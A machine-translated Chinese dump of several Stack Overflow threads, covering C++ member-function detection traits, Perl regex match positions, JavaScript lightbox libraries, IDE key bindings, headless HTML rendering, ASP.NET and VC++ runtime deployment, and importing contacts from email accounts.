根据[BOOST 讨论](http://lists.boost.org/boost-users/2009/01/44538.php)，发现另一个[线程](https://stackoverflow.com/a/1967183/2200040)提出了类似的建议。以下是将建议的解决方案概括为特征类的两个宏声明，遵循[boost::has_*](http://www.boost.org/doc/libs/1_53_0/libs/type_traits/doc/html/index.html)类的模型。

```
#include <boost/type_traits/is_class.hpp>
#include <boost/mpl/vector.hpp>

/// Has constant function
/** \param func_ret_type Function return type
    \param func_name Function name
    \param ... Variadic arguments are for the function parameters
*/
#define DECLARE_TRAITS_HAS_FUNC_C(func_ret_type, func_name, ...) \
    __DECLARE_TRAITS_HAS_FUNC(1, func_ret_type, func_name, ##__VA_ARGS__)

/// Has non-const function
/** \param func_ret_type Function return type
    \param func_name Function name
    \param ... Variadic arguments are for the function parameters
*/
#define DECLARE_TRAITS_HAS_FUNC(func_ret_type, func_name, ...) \
    __DECLARE_TRAITS_HAS_FUNC(0, func_ret_type, func_name, ##__VA_ARGS__)

// Traits content
#define __DECLARE_TRAITS_HAS_FUNC(func_const, func_ret_type, func_name, ...)  \
    template                                                                  \
    <   typename Type,                                                        \
        bool is_class = boost::is_class<Type>::value                          \
    >                                                                         \
    class has_func_ ## func_name;                                             \
    template<typename Type>                                                   \
    class has_func_ ## func_name<Type,false>                                  \
    {public:                                                                  \
        BOOST_STATIC_CONSTANT( bool, value = false );                         \
        typedef boost::false_type type;                                       \
    };                                                                        \
    template<typename Type>                                                   \
    class has_func_ ## func_name<Type,true>                                   \
    {   struct yes { char _foo; };                                            \
        struct no { yes _foo[2]; };                                           \
        struct Fallback                                                       \
        {   func_ret_type func_name( __VA_ARGS__ )                            \
                UTILITY_OPTIONAL(func_const,const) {}                         \
        };                                                                    \
        struct Derived : public Type, public Fallback {};                     \
        template <typename T, T t>  class Helper{};                           \
        template <typename U>                                                 \
        static no deduce(U*, Helper                                           \
            <   func_ret_type (Fallback::*)( __VA_ARGS__ )                    \
                    UTILITY_OPTIONAL(func_const,const),                       \
                &U::func_name                                                 \
            >* = 0                                                            \
        );                                                                    \
        static yes deduce(...);                                               \
    public:                                                                   \
        BOOST_STATIC_CONSTANT(                                                \
            bool,                                                             \
            value = sizeof(yes)                                               \
                == sizeof( deduce( static_cast<Derived*>(0) ) )               \
        );                                                                    \
        typedef ::boost::integral_constant<bool,value> type;                  \
        BOOST_STATIC_CONSTANT(bool, is_const = func_const);                   \
        typedef func_ret_type return_type;                                    \
        typedef ::boost::mpl::vector< __VA_ARGS__ > args_type;                \
    }

// Utility functions
#define UTILITY_OPTIONAL(condition, ...) UTILITY_INDIRECT_CALL( __UTILITY_OPTIONAL_ ## condition , ##__VA_ARGS__ )
#define UTILITY_INDIRECT_CALL(macro, ...) macro ( __VA_ARGS__ )
#define __UTILITY_OPTIONAL_0(...)
#define __UTILITY_OPTIONAL_1(...) __VA_ARGS__ 
```

这些宏扩展为具有以下原型的特征类：

```
template<class T>
class has_func_[func_name]
{
public:
    /// Function definition result value
    /** Tells if the tested function is defined for type T or not.
    */
    static const bool value = true | false;

    /// Function definition result type
    /** Type representing the value attribute usable in
        http://www.boost.org/doc/libs/1_53_0/libs/utility/enable_if.html
    */
    typedef boost::integral_constant<bool,value> type;

    /// Tested function constness indicator
    /** Indicates if the tested function is const or not.
        This value is not deduced, it is forced depending
        on the user call to one of the traits generators.
    */
    static const bool is_const = true | false;

    /// Tested function return type
    /** Indicates the return type of the tested function.
        This value is not deduced, it is forced depending
        on the user's arguments to the traits generators.
    */
    typedef func_ret_type return_type;

    /// Tested function arguments types
    /** Indicates the arguments types of the tested function.
        This value is not deduced, it is forced depending
        on the user's arguments to the traits generators.
    */
    typedef ::boost::mpl::vector< __VA_ARGS__ > args_type;
}; 
```

那么，一个典型的用途是什么？

```
// We enclose the traits class into
// a namespace to avoid collisions
namespace ns_0 {
    // Next line will declare the traits class
    // to detect the member function void foo(int,int) const
    DECLARE_TRAITS_HAS_FUNC_C(void, foo, int, int);
}

// we can use BOOST to help in using the traits
#include <boost/utility/enable_if.hpp>

// Here is a function that is active for types
// declaring the good member function
template<typename T> inline
typename boost::enable_if< ns_0::has_func_foo<T> >::type
foo_bar(const T &_this_, int a=0, int b=1)
{   _this_.foo(a,b);
}

// Here is a function that is active for types
// NOT declaring the good member function
template<typename T> inline
typename boost::disable_if< ns_0::has_func_foo<T> >::type
foo_bar(const T &_this_, int a=0, int b=1)
{   default_foo(_this_,a,b);
}

// Let us declare test types
struct empty
{
};
struct direct_foo
{
    void foo(int,int);
};
struct direct_const_foo
{
    void foo(int,int) const;
};
struct inherited_const_foo :
    public direct_const_foo
{
};

// Now anywhere in your code you can seamlessly use
// the foo_bar function on any object:
void test()
{
    int a;
    foo_bar(a); // calls default_foo

    empty b;
    foo_bar(b); // calls default_foo

    direct_foo c;
    foo_bar(c); // calls default_foo (member function is not const)

    direct_const_foo d;
    foo_bar(d); // calls d.foo (member function is const)

    inherited_const_foo e;
    foo_bar(e); // calls e.foo (inherited member function)
} 
```

* * *

## 回答 #10

> 赞同：5
> 
> 时间：2016-05-09T13:27:10.467

为此，我们需要使用：

1.  根据方法是否可用，具有不同返回类型的[函数模板重载](http://en.cppreference.com/w/cpp/language/function_template#Function_template_overloading)
2.  为了与[`type_traits`](http://en.cppreference.com/w/cpp/header/type_traits)标头中的元条件保持一致，我们希望从重载中返回 a [`true_type`or`false_type`](http://en.cppreference.com/w/cpp/types/integral_constant)
3.  声明`true_type`期望的重载`int`和`false_type`期望可变参数的重载以利用：[“重载解析中省略号转换的最低优先级”](http://en.cppreference.com/w/cpp/language/variadic_arguments#Notes)
4.  `true_type`在为我们将使用的函数定义模板规范时[`declval`](http://en.cppreference.com/w/cpp/utility/declval)，[`decltype`](http://en.cppreference.com/w/cpp/language/decltype)允许我们独立于返回类型差异或方法之间的重载来检测函数

**[你可以在这里](http://ideone.com/mi5JKQ)看到一个活生生的例子。**但我也会在下面解释它：

我想检查一个名为的函数的存在，该函数`test`采用可转换的类型`int`，然后我需要声明这两个函数：

```
template <typename T, typename S = decltype(declval<T>().test(declval<int>))> static true_type hasTest(int);
template <typename T> static false_type hasTest(...); 
```

*   `decltype(hasTest<a>(0))::value`是`true`（注意不需要创建特殊的功能来处理`void a::test()`过载，`void a::test(int)`被接受）
*   `decltype(hasTest<b>(0))::value`is `true`（因为`int`可转换为`double` `int b::test(double)`被接受，与返回类型无关）
*   `decltype(hasTest<c>(0))::value`是`false`（`c`没有一个名为`test`接受可转换类型的方法，`int`因此不接受）

该解决方案有两个缺点：

1.  需要一对函数的每个方法声明
2.  如果我们想测试相似的名称，特别是如果我们想测试类似的名称，例如我们将要测试`test()`方法的函数命名为什么，则会造成命名空间污染？

因此，在详细信息命名空间中声明这些函数很重要，或者理想情况下，如果它们仅与类一起使用，则应由该类私有声明。为此，我编写了一个宏来帮助您抽象这些信息：

```
#define FOO(FUNCTION, DEFINE) template <typename T, typename S = decltype(declval<T>().FUNCTION)> static true_type __ ## DEFINE(int); \
                              template <typename T> static false_type __ ## DEFINE(...); \
                              template <typename T> using DEFINE = decltype(__ ## DEFINE<T>(0)); 
```

你可以这样使用：

```
namespace details {
    FOO(test(declval<int>()), test_int)
    FOO(test(), test_void)
} 
```

随后调用`details::test_int<a>::value`or`details::test_void<a>::value`将产生`true`or`false`用于内联代码或元编程。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2012-11-07T08:58:12.313

您可以使用**[std::is_member_function_pointer](http://en.cppreference.com/w/cpp/types/is_member_function_pointer)**

```
class A {
   public:
     void foo() {};
}

 bool test = std::is_member_function_pointer<decltype(&A::foo)>::value; 
```

* * *

## 回答 #12

> 赞同：3
> 
> 时间：2008-09-17T20:44:20.613

为了不打扰，您还可以放入`serialize`被序列化的类或存档类的命名空间，这要归功于[Koenig lookup](http://en.wikipedia.org/wiki/Koenig_lookup)。有关更多详细信息，请参阅[自由函数覆盖的命名空间。](http://www.boost.org/doc/libs/1_36_0/libs/serialization/doc/serialization.html#namespaces):-)

打开任何给定的命名空间来实现自由功能是完全错误的。（例如，您不应该为自己的类型打开命名空间`std`来实现`swap`，而是应该使用 Koenig 查找。）

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2008-09-17T21:16:46.713

好的。第二次尝试。如果你不喜欢这个也没关系，我正在寻找更多的想法。

Herb Sutter 的文章谈到了特质。因此，您可以拥有一个特征类，其默认实例化具有回退行为，并且对于您的成员函数存在的每个类，特征类都专门用于调用成员函数。我相信 Herb 的文章提到了一种技术来做到这一点，因此它不涉及大量的复制和粘贴。

不过，就像我说的那样，也许您不希望与实现该成员的“标记”类相关的额外工作。在这种情况下，我正在寻找第三种解决方案......

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2020-04-28T14:38:38.780

我有类似的需求并遇到了这个 SO。这里提出了许多有趣/强大的解决方案，尽管对于特定需求来说有点长：检测类是否具有具有精确签名的成员函数。所以我做了一些阅读/测试，并提出了我可能感兴趣的版本。它检测：

*   静态成员函数
*   非静态成员函数
*   非静态成员函数 const

带有精确的签名。因为我不需要捕获*任何*签名（这需要更复杂的解决方案），所以这个适合我。它基本上使用**了 enable_if_t**。

```
struct Foo{ static int sum(int, const double&){return 0;} };
struct Bar{ int calc(int, const double&) {return 1;} };
struct BarConst{ int calc(int, const double&) const {return 1;} };

// Note : second typename can be void or anything, as long as it is consistent with the result of enable_if_t
template<typename T, typename = T> struct has_static_sum : std::false_type {};
template<typename T>
struct has_static_sum<typename T,
                        std::enable_if_t<std::is_same<decltype(T::sum), int(int, const double&)>::value,T> 
                      > : std::true_type {};

template<typename T, typename = T> struct has_calc : std::false_type {};
template<typename T>
struct has_calc <typename T,
                  std::enable_if_t<std::is_same<decltype(&T::calc), int(T::*)(int, const double&)>::value,T>
                > : std::true_type {};

template<typename T, typename = T> struct has_calc_const : std::false_type {};
template<typename T>
struct has_calc_const <T,
                        std::enable_if_t<std::is_same<decltype(&T::calc), int(T::*)(int, const double&) const>::value,T>
                      > : std::true_type {};

int main ()
{
    constexpr bool has_sum_val = has_static_sum<Foo>::value;
    constexpr bool not_has_sum_val = !has_static_sum<Bar>::value;

    constexpr bool has_calc_val = has_calc<Bar>::value;
    constexpr bool not_has_calc_val = !has_calc<Foo>::value;

    constexpr bool has_calc_const_val = has_calc_const<BarConst>::value;
    constexpr bool not_has_calc_const_val = !has_calc_const<Bar>::value;

    std::cout<< "           has_sum_val " << has_sum_val            << std::endl
             << "       not_has_sum_val " << not_has_sum_val        << std::endl
             << "          has_calc_val " << has_calc_val           << std::endl
             << "      not_has_calc_val " << not_has_calc_val       << std::endl
             << "    has_calc_const_val " << has_calc_const_val     << std::endl
             << "not_has_calc_const_val " << not_has_calc_const_val << std::endl;
} 
```

输出 ：

```
 has_sum_val 1
       not_has_sum_val 1
          has_calc_val 1
      not_has_calc_val 1
    has_calc_const_val 1
not_has_calc_const_val 1 
```

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2017-07-09T17:21:06.617

如果没有 C++11 支持 ( `decltype`)，这可能会起作用：

# SSCCE

```
#include <iostream>
using namespace std;

struct A { void foo(void); };
struct Aa: public A { };
struct B { };

struct retA { int foo(void); };
struct argA { void foo(double); };
struct constA { void foo(void) const; };
struct varA { int foo; };

template<typename T>
struct FooFinder {
    typedef char true_type[1];
    typedef char false_type[2];

    template<int>
    struct TypeSink;

    template<class U>
    static true_type &match(U);

    template<class U>
    static true_type &test(TypeSink<sizeof( matchType<void (U::*)(void)>( &U::foo ) )> *);

    template<class U>
    static false_type &test(...);

    enum { value = (sizeof(test<T>(0, 0)) == sizeof(true_type)) };
};

int main() {
    cout << FooFinder<A>::value << endl;
    cout << FooFinder<Aa>::value << endl;
    cout << FooFinder<B>::value << endl;

    cout << FooFinder<retA>::value << endl;
    cout << FooFinder<argA>::value << endl;
    cout << FooFinder<constA>::value << endl;
    cout << FooFinder<varA>::value << endl;
} 
```

# 希望如何运作

`A`，`Aa`并且`B`是有问题的类，`Aa`是继承我们正在寻找的成员的特殊类。

在and中是对应的 C++11 类的替代品`FooFinder`。同样为了理解模板元编程，它们揭示了 SFINAE-sizeof-trick 的基础。`true_type``false_type`

这`TypeSink`是一个模板结构，稍后用于将`sizeof`运算符的积分结果下沉到模板实例化中以形成一个类型。

该`match`函数是另一种 SFINAE 类型的模板，没有通用的对应物。因此，只有当其参数的类型与它专门用于的类型匹配时，它才能被实例化。

这两个`test`函数与枚举声明一起最终形成了中央 SFINAE 模式。有一个通用的使用省略号返回`false_type`和具有更具体参数的对应项优先。

为了能够`test`使用模板参数实例`T`化`match`函数，必须实例化函数，因为实例化`TypeSink`参数需要它的返回类型。需要注意的是`&U::foo`，被包装在函数参数中的 ，*不是*从模板参数特化中引用的，因此仍然会发生继承的成员查找。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2019-04-15T03:32:48.953

如果您使用的是 facebook 愚蠢，它们是开箱即用的宏来帮助您：

```
#include <folly/Traits.h>
namespace {
  FOLLY_CREATE_HAS_MEMBER_FN_TRAITS(has_test_traits, test);
} // unnamed-namespace

void some_func() {
  cout << "Does class Foo have a member int test() const? "
    << boolalpha << has_test_traits<Foo, int() const>::value;
} 
```

虽然实现细节与前面的答案相同，但使用库更简单。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2020-06-28T18:50:42.850

基于[jrok](https://stackoverflow.com/users/947836/jrok)的[回答](https://stackoverflow.com/a/16824239/2379665)，我避免使用嵌套模板类和/或函数。

```
#include <type_traits>

#define CHECK_NESTED_FUNC(fName) \
    template <typename, typename, typename = std::void_t<>> \
    struct _has_##fName \
    : public std::false_type {}; \
    \
    template <typename Class, typename Ret, typename... Args> \
    struct _has_##fName<Class, Ret(Args...), \
        std::void_t<decltype(std::declval<Class>().fName(std::declval<Args>()...))>> \
    : public std::is_same<decltype(std::declval<Class>().fName(std::declval<Args>()...)), Ret> \
    {}; \
    \
    template <typename Class, typename Signature> \
    using has_##fName = _has_##fName<Class, Signature>;

#define HAS_NESTED_FUNC(Class, Func, Signature) has_##Func<Class, Signature>::value 
```

我们可以使用上面的宏，如下所示：

```
class Foo
{
public:
    void Bar(int, const char *) {}
};

CHECK_NESTED_FUNC(Bar);  // generate required metafunctions

int main()
{
    using namespace std;
    cout << boolalpha
         << HAS_NESTED_FUNC(Foo, Bar, void(int, const char *))  // prints true
         << endl;
    return 0;
} 
```

欢迎提出建议。

# javascript - 显示相册的 javascript 库

> ID：87373
> 
> 赞同：2
> 
> 时间：2008-09-17T20:36:48.010
> 
> 标签：javascript

过去我访问过几个网站，它们有一组照片缩略图，单击其中一个会产生一种很酷的效果，即显示全尺寸图像的扩展弹出窗口。是否有任何可用的免费 JavaScript 库可以做到这一点？

我主要对弹出效果感兴趣，对专辑管理的其余部分不太感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:39:18.350

Lightbox 是另一个流行的： [Lightbox Project Page](http://www.lokeshdhakar.com/projects/lightbox2/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:38:00.427

[jQuery](http://www.jquery.com)的[thickbox插件](http://jquery.com/demo/thickbox/)会做你想做的事。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:39:38.240

查看 jQuery [http://jquery.com](http://jquery.com)

然后是 jQuery 的 LightBox 插件：http: [//leandrovieira.com/projects/jquery/lightbox/](http://leandrovieira.com/projects/jquery/lightbox/)

# regex - 如何在 Perl 中找到正则表达式匹配的位置？

> ID：87380
> 
> 赞同：34
> 
> 时间：2008-09-17T20:37:16.700
> 
> 标签：regex, perl

我需要编写一个接收字符串和正则表达式的函数。我需要检查是否有匹配并返回匹配的开始和结束位置。（正则表达式已由 编译`qr//`。）

该函数可能还会收到一个“全局”标志，然后我需要返回所有匹配项的 (start,end) 对。

我无法更改正则表达式，甚至不能`()`像用户可能使用的那样添加它`()`和`\1`. 也许我可以使用`(?:)`.

示例：给定“ababab”和正则表达式`qr/ab/`，在全局情况下，我需要取回 3 对（开始，结束）。

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2008-09-17T20:54:04.070

内置变量`@-`和`@+`分别保存最后一次成功匹配的开始和结束位置。`$-[0]`和`$+[0]`对应于整个模式，而`$-[N]`和`$+[N]`对应于`$N`( `$1`, `$2`, 等) 子匹配。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2008-09-17T20:47:29.157

忘记我以前的帖子，我有一个更好的主意。

```
sub match_positions {
    my ($regex, $string) = @_;
    return if not $string =~ /$regex/;
    return ($-[0], $+[0]);
}
sub match_all_positions {
    my ($regex, $string) = @_;
    my @ret;
    while ($string =~ /$regex/g) {
        push @ret, [ $-[0], $+[0] ];
    }
    return @ret
} 
```

这种技术不会以任何方式改变正则表达式。

编辑添加：以$1..$9 的价格从*perlvar报价。***“这些变量都是只读的，并且动态地作用于当前的 BLOCK。”** 换句话说，如果你想使用 $1..$9，你不能使用子程序来进行匹配。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-09-17T20:38:53.420

pos 函数为您提供匹配的位置。如果将正则表达式放在括号中，则可以使用`length $1`. 像这样

```
sub match_positions {
    my ($regex, $string) = @_;
    return if not $string =~ /($regex)/;
    return (pos($string) - length $1, pos($string));
}
sub all_match_positions {
    my ($regex, $string) = @_;
    my @ret;
    while ($string =~ /($regex)/g) {
        push @ret, [pos($string) - length $1, pos($string)];
    }
    return @ret
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:43:13.473

如果您愿意让程序中的所有 RE 执行得更慢，您也可以使用已弃用的 $` 变量。来自 perlvar：

```
 $‘      The string preceding whatever was matched by the last successful pattern match (not
           counting any matches hidden within a BLOCK or eval enclosed by the current BLOCK).
           (Mnemonic: "`" often precedes a quoted string.)  This variable is read-only.

           The use of this variable anywhere in a program imposes a considerable performance penalty
           on all regular expression matches.  See "BUGS". 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-22T00:16:37.520

```
#!/usr/bin/perl

# search the postions for the CpGs in human genome

sub match_positions {
    my ($regex, $string) = @_;
    return if not $string =~ /($regex)/;
    return (pos($string), pos($string) + length $1);
}
sub all_match_positions {
    my ($regex, $string) = @_;
    my @ret;
    while ($string =~ /($regex)/g) {
        push @ret, [(pos($string)-length $1),pos($string)-1];
    }
    return @ret
}

my $regex='CG';
my $string="ACGACGCGCGCG";
my $cgap=3;    
my @pos=all_match_positions($regex,$string);

my @hgcg;

foreach my $pos(@pos){
    push @hgcg,@$pos[1];
}

foreach my $i(0..($#hgcg-$cgap+1)){
my $len=$hgcg[$i+$cgap-1]-$hgcg[$i]+2;
print "$len\n"; 
} 
```

# visual-studio - Resharper 和 ViEmu 键绑定（和 Visual Assist）

> ID：87381
> 
> 赞同：11
> 
> 时间：2008-09-17T20:37:21.160
> 
> 标签：visual-studio, resharper, visual-assist, viemu

使用 ViEmu，您确实需要解除许多重新锐化键绑定才能使其正常工作。

有没有人有他们认为在使用 ViEmu 时适用于 resharper 的一组很好的键绑定？

我目前正在使用 Resharper 的 Visual Studio 绑定做什么。用 ViEmu 烘烤所有冲突的，然后通过菜单修改器驱动其余的（菜单项的 Alt-R 键盘快捷键）。我也对 Visual Assist 快捷方式（用于 C++）做同样的事情

如果有人对 ViEmu / Resharper 或 Visual Assist 一起工作有任何提示和技巧，我会非常感谢它！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-06-15T05:26:18.983

您还可以在 ViEmu 中创建将调用 VS 和 R# 操作的映射。例如，我的 _viemurc 文件中有这些行用于注释和取消注释选择：

```
map <C-S-c> gS:vsc Edit.CommentSelection<CR>
map <C-A-c> gS:vsc Edit.UncommentSelection<CR> 
```

:vsc 用于“visual studio 命令”，然后输入命令的确切文本，当您转到工具>选项>键盘时，它会显示在命令列表中

我不以这种方式使用任何 R#，但它确实有效，如下所示：

```
map <C-S-A-f> gS:vsc ReSharper.FindUsages<CR> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-01T12:59:55.803

我也同时使用这两种方法，但我使用的是 IntelliJ 键绑定，因此我无法具体说明 Visual Studio 绑定。[JP Boodhoo 通过 AutoHotKey](http://blog.developwithpassion.com/2008/07/vs-viemu-resharper-modded-with-autohotkey)进行了一些更改，以便为 Visual Studio + ReSharper + ViEmu 提供额外的类似 Vim 的功能。

不过，我已经删除了一些扫描的键，因为我想保留一些 ReSharper 功能而不是 ViEmu 功能，尽管随着我从 ViEmu 或 ReSharper 学习更多快捷方式，我使用这些工具的方式会随着时间而改变。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2011-04-09T10:25:24.707

我注意到以下内容，了解这些内容可能很有用。 **ViEmu 软管的一些 ReSharper 键盘映射将在您打开不同的 ReSharper 对话框后工作。** *我使用基于 IntelliJ IDEA 的快捷方式，但我认为这对于 ReSharper 的 VS 方案同样适用*。

**示例：** ViEmu 绑定到`Ctrl+N`R# 用于`Go To Type`. 但是，ViEmu 不会绑定到`Ctrl+Shift+N`R# 用于`Go To File`. 因此，如果您点击`Ctrl+Shift+N` **Go To 对话框，则会启动**。然后，您可以将手指从 Shift 上移开并再次**按 N，对话框将切换**到`Go To Type`。

这非常有用，如果你像我一样使用`Go To Type`很多并且不想弄乱键盘映射。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-09-03T05:05:56.000

正如@Jay 所说，最好的方法是设置自定义绑定。

这是[https://github.com/StanislawSwierc/Profile](https://github.com/StanislawSwierc/Profile)上的绑定示例。[我在https://github.com/w1ld/viemu_settings](https://github.com/w1ld/viemu_settings)的基础上创建了我的绑定

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T22:12:32.307

我使用这两个插件，但我更喜欢 ViEmu 提供的 Vi 输入模型的强大功能。我真的不会错过 Resharper 键绑定...

# c# - 无头 HTML 渲染，最好是开源的

> ID：87386
> 
> 赞同：11
> 
> 时间：2008-09-17T20:37:35.327
> 
> 标签：c#, .net, html, browser

我目前正在寻求执行一些无头 HTML 渲染，以实质上在屏幕外创建资源并将结果保存为图像。目的是采用 HTML 语言的一个子集并将其应用于小屏幕设备（如 PocketPC），因为我们的用户知道 HTML，并且从 Photoshop 到 HTML 标记的转换是可以接受的。

我也在考虑使用 WPF Imaging，所以如果有人可以对它的使用发表评论（特别是你会指出你的用户用于创建 WPF 布局的工具，你可以将其转换为图像以及它的性能如何），我将不胜感激。

我的优先顺序是：

1.  开源
2.  高性能
3.  本机 C# 或 C# 包装器
4.  在 Windows 上实现的最低复杂性

我不太担心无头渲染的功能有多丰富，因为我们不会大量使用 JavaScript、Flash 或除图像之外的其他嵌入对象。我对任何使用 IE、Firefox、webkit 甚至自定义渲染实现的东西都很好，只要它的实现接近标准兼容。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2011-09-18T10:37:16.203

[http://www.phantomjs.org/](http://www.phantomjs.org/)

**完整的网络堆栈**

PhantomJS 是一个带有 JavaScript API 的无头 WebKit。它具有对各种 Web 标准的快速和原生支持：DOM 处理、CSS 选择器、JSON、Canvas 和 SVG。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:10:17.010

[您可以使用 Gecko 来执行此操作。](http://weblogs.mozillazine.org/roc/archives/2005/05/rendering_web_p.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:15:10.477

我在搜索过程中发现[了 IECapt](http://iecapt.sourceforge.net/)，它实际上包含一个 C# 实现。尽管它设计为 CLI 应用程序，但提供了源代码，因此我可以根据自己的需要对其进行修改。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-17T09:18:53.683

合适的工具是用于 WebKit（Safari、Google Chrome）和[IECapt](http://cutycapt.sourceforge.net/)（MS IE）的[CutyCapt 。](http://iecapt.sourceforge.net/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:43:59.493

[Flying Saucer](http://code.google.com/p/flying-saucer//)是一个基于 Java 的 XHTML 和 CSS2.1 渲染器，它通过 ACID2 并带有一些错误警告。它的缺点是它没有错误处理。它并不是真正设计成一个浏览器，而是一个用于在应用程序中显示 HTML 内容（帮助文件等）的组件。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-22T23:53:57.083

我喜欢将 url2png 用于这些类型的作业/屏幕截图。

# asp.net - 在 Windows 2003 x64 上同时使用 1.1 和 2.0 框架

> ID：87398
> 
> 赞同：0
> 
> 时间：2008-09-17T20:38:16.400
> 
> 标签：asp.net, iis, windows-server-2003

因此，令我烦恼的是（经过大量研究），在 64 位 2003 安装上运行 1.1 和 2.0 dot.net 框架时，它会从 IIS 属性中删除 asp.net 选项卡。我试过注册表黑客，我试过注册两个框架的 32 位版本，但没有运气。我唯一的解决办法是运行Dennis Bauer 提供 的出色的[ASP.NET 切换器。](http://www.denisbauer.com/NETTools/ASPNETVersionSwitcher.aspx)

其他人有任何见解吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-18T04:03:04.880

此外，您可以尝试运行 32 位版本的 MMC。IIRC，MMC 只能加载与自身相同位数的扩展，而 .Net 2.0 扩展仅为 32 位。

也就是说，您在问题中链接的工具对于解决此问题也非常有用。

# c++ - 不同版本的 C++ 库

> ID：87405
> 
> 赞同：3
> 
> 时间：2008-09-17T20:38:36.383
> 
> 标签：c++, windows, windows-vista, windows-xp

在 vista 上使用 Visual Studio 2008 编译一个简单的 C++ 项目后，一切都在原始 vista 机器和其他 vista 计算机上运行良好。但是，将其移至 XP 框会导致错误消息：“应用程序无法启动，因为应用程序配置不正确”。

我该怎么做才能使我编译的 EXE 在 XP 和 Vista 上运行？几个月前我也遇到了同样的问题，只是在项目上摆弄了一些设置来修复它，但我不记得我改变了哪些。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T20:43:11.133

您需要在目标计算机上安装 Visual Studios 2008 运行时：

> [http://www.microsoft.com/downloads/details.aspx?FamilyID=9b2da534-3e03-4391-8a4d-074b9f2bc1bf&displaylang=en](http://www.microsoft.com/downloads/details.aspx?FamilyID=9b2da534-3e03-4391-8a4d-074b9f2bc1bf&displaylang=en)

或者，您也可以静态链接运行时，在项目属性窗口中转到：

> c++ -> 代码生成 -> 运行时库并选择“多线程/MT”

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T20:40:39.967

您需要将运行时可再发行文件安装到您尝试运行应用程序的机器上。

2008 年的可再发行产品在[这里](http://www.microsoft.com/downloads/details.aspx?FamilyID=9b2da534-3e03-4391-8a4d-074b9f2bc1bf&displaylang=en)。

2005 年的可再发行产品在[这里](http://www.microsoft.com/downloads/details.aspx?FamilyID=32BC1BEE-A3F9-4C13-9C99-220B62A191EE&displaylang=en)。

它们可以并排安装，以防您需要两者。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T20:57:58.897

您可能需要将 VC 运行时与您的应用程序一起分发。有多种方法可以做到这一点。 [Microsoft Visual C++ 团队的这篇文章](http://blogs.msdn.com/vcblog/archive/2007/10/12/how-to-redistribute-the-visual-c-libraries-with-your-application.aspx)最好地解释了在使用 Visual Studio 2005 或 2008 时分发这些依赖项的不同方法。

如文章所述，尽管您可以下载 Redistributable 安装程序包并在客户端计算机上简单地启动它，但这几乎总是不是最佳选择。通常有更好的方法来包含所需的 DLL，例如，如果您通过 Windows 安装程序分发，则包含合并模块；如果您只想分发压缩文件夹，则包含 App-Local 副本。

另一种选择是静态链接运行时库，而不是与您的应用程序一起分发它们。此选项仅适用于不加载其他 DLL 的独立 EXE。您也不能对其他应用程序加载的 DLL 执行此操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:11:05.823

静态链接到运行时是最简单的。

c++ -> 代码生成 -> 运行时库并选择“多线程/MT”

However, this does make your executable a couple hundred KByte larger. This might be a problem if you are installing a large number of small programs, since each will be burdened by its very own copy of the runtime. The answer is to create an installer.

New project -> "setup and deployment" -> "setup project"

Load the output from your application projects ( defined using the DLL version of the runtime ) into the installer project and build it. The dependency on the runtime DLL will be noticed, included in the installer package, and neatly and unobtrusively installed in the correct place on the target machine.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:38:29.597

Visual studio 2005 actually has two

The one for [the original release](http://www.microsoft.com/downloads/details.aspx?FamilyID=32BC1BEE-A3F9-4C13-9C99-220B62A191EE&displaylang=en)

and the one [for SP1](http://www.microsoft.com/downloads/details.aspx?familyid=200b2fd9-ae1a-4a14-984d-389c36f85647&displaylang=en)

# email - 从电子邮件帐户获取联系人

> ID：87408
> 
> 赞同：5
> 
> 时间：2008-09-17T20:38:49.583
> 
> 标签：email, extract

许多网站，如 twitter、facebook 和其他网站，让用户输入他们的电子邮件 ID 和密码，并据此“提取”联系人。

有谁知道这是怎么做到的？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T21:01:31.400

撇开道德问题不谈，有一个商业图书馆可以为您做到这一点：[http ://www.octazen.com/product_abimporter.php](http://www.octazen.com/product_abimporter.php)

该库可用于 PHP、.NET、Java、Ruby 和 ColdFusion。它支持从数十种不同的服务（包括所有主要服务）导入联系人。

许可证只需大约 100 美元，运行良好，并且（使用 Java 版本）只需要这行代码即可从任何受支持的服务中导入联系人：

```
List<Contact> contacts = SimpleAddressBookImporter.fetchContacts(emailAddress, password) 
```

他们有另一个库，可以从社交网络导入朋友列表，虽然我没有尝试过。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-09-17T20:39:57.490

他们登录您的帐户并抓取内容，或使用公共 API。无论哪种方式，这都不是我自己实施或使用的方法，因为我不会相信任何人拥有我的凭据。而且我认为它教会用户不要对他们的凭据保密。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:18:27.460

